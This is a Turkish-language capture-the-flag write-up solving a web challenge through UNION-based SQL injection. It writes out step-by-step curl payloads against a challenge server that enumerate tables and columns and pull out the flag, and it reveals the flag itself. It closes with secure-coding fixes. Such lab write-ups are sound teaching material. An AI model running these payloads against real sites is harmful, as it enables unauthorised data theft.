# 💉 Union - Web Challenge 

<p align="center">
  <img src="https://img.shields.io/badge/Web-Challenge-darkblue?style=for-the-badge" alt="Web">
  <img src="https://img.shields.io/badge/Difficulty-Orta-darkoragne?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-UNION SQL Injection-purple?style=for-the-badge" alt="SQL Injection">
</p>

---

## 📋 Soru Bilgileri
  
**Kategori:** Web  
**Seviye:** Orta   
**Puan:** 600

**Challenge URL:** http://64.226.74.243:10004/?id=1

---

## 🔍 Analiz

**Hedef:** UNION-based SQL Injection kullanarak veritabanından flag'i çekmek  

**Strateji:** Parametre analizi → Sütun sayısı keşfi → UNION SELECT → Tablo/sütun enumeration → Flag extraction

**İpuçları:**
- 💡 URL'de GET parametresi var: `?id=1`
- 🎯 "Data is just data" → Flag muhtemelen bir tabloda veri olarak saklanıyor
- 📊 UNION injection için sütun sayısı kritik

---

## ✅ Çözüm Adımları

### 🔧 **Adım 1: İlk Keşif - Uygulama Analizi**

**Terminalden sayfayı inceliyoruz:**

```bash
curl "http://64.226.74.243:10004/?id=1"
```

**Response:**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Hard - Products</title>
</head>
<body>
<h2>Product Detail</h2>
<p><b>Name:</b> Book</p><p><b>Price:</b> 10</p><hr>
<p><i>Hint: Data is just data.</i></p>
</body>
</html>
```

**Analiz:**
- ✅ **Parametre:** `id` (GET)
- ✅ **Çıktı:** Ürün adı ve fiyat gösteriliyor
- ✅ **İpucu:** "Data is just data" → Flag bir veri olarak tabloda
- 💡 SQL: `SELECT name, price FROM products WHERE id = 1`

---

### 🧪 **Adım 2: Farklı ID'leri Test Etme**

```bash
curl "http://64.226.74.243:10004/?id=2"
curl "http://64.226.74.243:10004/?id=3"
```

**Sonuçlar:**
- `id=1` → Book, Price: 10
- `id=2` → Pen, Price: 2
- `id=3` → Notebook, Price: 5

**Sonuç:** ✅ Normal çalışıyor, SQL Injection test edebiliriz

---

### 🔍 **Adım 3: SQL Injection Testi**

**Tek tırnak ile test:**

```bash
curl "http://64.226.74.243:10004/?id=1'"
```

**Response:**

```html
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax
```

**Analiz:**
- ✅ **SQL hatası aldık!** 
- ✅ Zafiyet VAR!
- 💡 Tek tırnak filtreleniyor, ama numeric injection çalışabilir

---

### 📊 **Adım 4: Sütun Sayısı Keşfi - ORDER BY**

**ORDER BY ile sütun sayısını buluyoruz:**

```bash
curl "http://64.226.74.243:10004/?id=1+ORDER+BY+1"
# ✅ Çalıştı - Product gösterildi

curl "http://64.226.74.243:10004/?id=1+ORDER+BY+2"
# ✅ Çalıştı - Product gösterildi

curl "http://64.226.74.243:10004/?id=1+ORDER+BY+3"
# ❌ HATA: Unknown column '3' in 'order clause'

curl "http://64.226.74.243:10004/?id=1+ORDER+BY+4"
# ❌ HATA: Unknown column '4' in 'order clause'
```

**Sonuç:**
- ✅ **Sütun sayısı: 2**
- 💡 `ORDER BY 2` çalıştı, `ORDER BY 3` hata verdi

---

### 🧬 **Adım 5: UNION SELECT ile Veri Çekme Testi**

**NULL değerlerle test:**

```bash
curl "http://64.226.74.243:10004/?id=1+UNION+SELECT+NULL,NULL"
```

**Response:**

```html
<p><b>Name:</b> </p>
<p><b>Price:</b> </p>
```

**Sonuç:** ✅ UNION çalışıyor! NULL değerler boş gösteriliyor

---

**Sayı değerleriyle test:**

```bash
curl "http://64.226.74.243:10004/?id=-1+UNION+SELECT+1,2"
```

**Response:**

```html
<p><b>Name:</b> 1</p>
<p><b>Price:</b> 2</p>
```

**Analiz:**
- ✅ **Birinci sütun:** Name alanında gösteriliyor
- ✅ **İkinci sütun:** Price alanında gösteriliyor
- 💡 `-1` kullanarak orijinal sonuçları gizledik

---

### 🗄️ **Adım 6: Veritabanı Bilgilerini Çekme**

**Database ve version bilgisi:**

```bash
curl "http://64.226.74.243:10004/?id=-1+UNION+SELECT+database(),version()"
```

**Response:**

```html
<p><b>Name:</b> hard_db</p>
<p><b>Price:</b> 8.0.45</p>
```

**Bilgiler:**
- ✅ **Database:** hard_db
- ✅ **MySQL Version:** 8.0.45

---

### 📋 **Adım 7: Tablo İsimlerini Listeleme**

```bash
curl "http://64.226.74.243:10004/?id=-1+UNION+SELECT+table_name,table_schema+FROM+information_schema.tables+WHERE+table_schema=database()"
```

**Response:**

```html
<p><b>Name:</b> flags</p><p><b>Price:</b> hard_db</p><hr>
<p><b><Name:</b> products</p><p><b>Price:</b> hard_db</p><hr>
```

**Bulunan Tablolar:**
- ✅ `flags` → FLAG burada olmalı!
- ✅ `products` → Mevcut ürün tablosu

---

### 🔬 **Adım 8: Sütun İsimlerini Listeleme**

```bash
curl "http://64.226.74.243:10004/?id=-1+UNION+SELECT+column_name,table_name+FROM+information_schema.columns+WHERE+table_schema=database()"
```

**Response:**

```html
<p><b>Name:</b> id</p><p><b>Price:</b> flags</p><hr>
<p><b>Name:</b> flag</p><p><b>Price:</b> flags</p><hr>
<p><b>Name:</b> id</p><p><b>Price:</b> products</p><hr>
<p><b>Name:</b> name</p><p><b>Price:</b> products</p><hr>
<p><b>Name:</b> price</p><p><b>Price:</b> products</p><hr>
```

**Tablo Yapısı:**

**flags tablosu:**
- `id`
- `flag` ← FLAG BURADA!

**products tablosu:**
- `id`
- `name`
- `price`

---

### 💎 **Adım 9: FLAG Çekme - EXPLOIT!**

**Flag'i çekelim:**

```bash
curl "http://64.226.74.243:10004/?id=-1+UNION+SELECT+flag,NULL+FROM+flags"
```

**🎉 BINGO! Response:**

```html
<p><b>Name:</b> FLAG{union_select_seni_bekliyordu324435876485}</p>
<p><b>Price:</b> </p>
```

**✅ BAŞARILI! FLAG elde edildi!**

---

## 🏁 **FLAG**

```
FLAG{union_select_seni_bekliyordu324435876485}
```

---

## 🧬 Teknik Analiz

### **Güvensiz Kod Akışı**

```php
// GÜVENSIZ KOD (Tahmini)
$id = $_GET['id'];

$query = "SELECT name, price FROM products WHERE id = $id";
$result = $mysqli->query($query);

if ($row = $result->fetch_assoc()) {
    echo "<p><b>Name:</b> " . htmlspecialchars($row['name']) . "</p>";
    echo "<p><b>Price:</b> " . htmlspecialchars($row['price']) . "</p>";
}
```

**Zafiyet:**
- ❌ `$id` direkt sorguya ekleniyor
- ❌ Numeric parametre olduğu için tırnak koruması yok
- ❌ Prepared statements kullanılmamış

---

### **Exploit Akışı**

**1. Normal Sorgu:**
```sql
SELECT name, price FROM products WHERE id = 1
# Sonuç: Book, 10
```

**2. ORDER BY ile Sütun Keşfi:**
```sql
SELECT name, price FROM products WHERE id = 1 ORDER BY 2
# ✅ Çalışır - 2 sütun var

SELECT name, price FROM products WHERE id = 1 ORDER BY 3
# ❌ Hata - 3. sütun yok
```

**3. UNION SELECT Test:**
```sql
SELECT name, price FROM products WHERE id = -1 UNION SELECT 1,2
# Sonuç: Name: 1, Price: 2
```

**4. Database Enumeration:**
```sql
# Tabloları listele
SELECT name, price FROM products WHERE id = -1 
UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema=database()
# Sonuç: flags, products

# Sütunları listele
SELECT name, price FROM products WHERE id = -1 
UNION SELECT column_name, table_name FROM information_schema.columns WHERE table_schema=database()
# Sonuç: id, flag (flags tablosunda)
```

**5. FLAG Extraction:**
```sql
SELECT name, price FROM products WHERE id = -1 
UNION SELECT flag, NULL FROM flags
# Sonuç: FLAG{union_select_seni_bekliyordu324435876485}
```

---

### **UNION SQL Injection Şartları**

✅ **1. Sütun sayısı eşit olmalı:**
- Orijinal sorgu: 2 sütun (name, price)
- UNION sorgusu: 2 sütun (flag, NULL)

✅ **2. Veri tipleri uyumlu olmalı:**
- İlk sütun: String (name / flag)
- İkinci sütun: Numeric/NULL (price / NULL)

✅ **3. UNION ALL kullanımı:**
- `UNION` → Duplicate'leri kaldırır
- `UNION ALL` → Tüm sonuçları gösterir

---

## 🛡️ Nasıl Önlenir?

### **1. Prepared Statements (Kritik!)**

```php
// GÜVENLİ KOD
$id = $_GET['id'];

$stmt = $mysqli->prepare("SELECT name, price FROM products WHERE id = ?");
$stmt->bind_param("i", $id);  // "i" = integer
$stmt->execute();
$result = $stmt->get_result();

if ($row = $result->fetch_assoc()) {
    echo "<p><b>Name:</b> " . htmlspecialchars($row['name']) . "</p>";
    echo "<p><b>Price:</b> " . htmlspecialchars($row['price']) . "</p>";
}
```

---

### **2. Input Validation**

```php
// Numeric parametre kontrolü
$id = $_GET['id'];

if (!is_numeric($id) || $id < 1) {
    die("Invalid ID");
}

// Integer'a cast et
$id = (int)$id;
```

---

### **3. Least Privilege Principle**

```sql
-- Database kullanıcısı sadece SELECT yapabilmeli
GRANT SELECT ON hard_db.products TO 'web_user'@'localhost';

-- information_schema erişimini kısıtla (mümkünse)
REVOKE SELECT ON information_schema.* FROM 'web_user'@'localhost';
```

---

### **4. Error Handling**

```php
// SQL hatalarını kullanıcıya gösterme
mysqli_report(MYSQLI_REPORT_OFF);

if (!$result) {
    error_log($mysqli->error);  // Loglara yaz
    die("An error occurred");    // Genel mesaj göster
}
```

---

## 🛠️ **Kullanılan Komutlar**

```bash
# İlk keşif
curl "http://64.226.74.243:10004/?id=1"

# Farklı ID'ler
curl "http://64.226.74.243:10004/?id=2"
curl "http://64.226.74.243:10004/?id=3"

# SQL Injection testi
curl "http://64.226.74.243:10004/?id=1'"

# Sütun sayısı keşfi
curl "http://64.226.74.243:10004/?id=1+ORDER+BY+1"
curl "http://64.226.74.243:10004/?id=1+ORDER+BY+2"
curl "http://64.226.74.243:10004/?id=1+ORDER+BY+3"  # HATA

# UNION test
curl "http://64.226.74.243:10004/?id=-1+UNION+SELECT+1,2"

# Database bilgisi
curl "http://64.226.74.243:10004/?id=-1+UNION+SELECT+database(),version()"

# Tablo listeleme
curl "http://64.226.74.243:10004/?id=-1+UNION+SELECT+table_name,table_schema+FROM+information_schema.tables+WHERE+table_schema=database()"

# Sütun listeleme
curl "http://64.226.74.243:10004/?id=-1+UNION+SELECT+column_name,table_name+FROM+information_schema.columns+WHERE+table_schema=database()"

# FLAG extraction
curl "http://64.226.74.243:10004/?id=-1+UNION+SELECT+flag,NULL+FROM+flags"
```

---

## 💭 **Çözüm Akışı**

```
🌐 Union Web Challenge
            ↓
🔧 URL Analizi
   → GET parametre: ?id=1
   → Ürün bilgisi gösteriliyor
            ↓
🧪 SQL Injection Testi
   → id=1' → SQL hatası!
   → Numeric injection mümkün
            ↓
📊 Sütun Sayısı Keşfi
   → ORDER BY 1 ✅
   → ORDER BY 2 ✅
   → ORDER BY 3 ❌
   → Sonuç: 2 sütun
            ↓
🧬 UNION SELECT Test
   → -1 UNION SELECT 1,2
   → Name: 1, Price: 2 → Başarılı!
            ↓
🗄️ Database Enumeration
   → database() → hard_db
   → Tablolar → flags, products
   → Sütunlar → id, flag (flags)
            ↓
💎 FLAG Extraction
   → -1 UNION SELECT flag,NULL FROM flags
            ↓
🏁 FLAG{union_select_seni_bekliyordu324435876485}
```
- [MySQL UNION Syntax](https://dev.mysql.com/doc/refman/8.0/en/union.html)
- [information_schema Tables](https://dev.mysql.com/doc/refman/8.0/en/information-schema.html)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
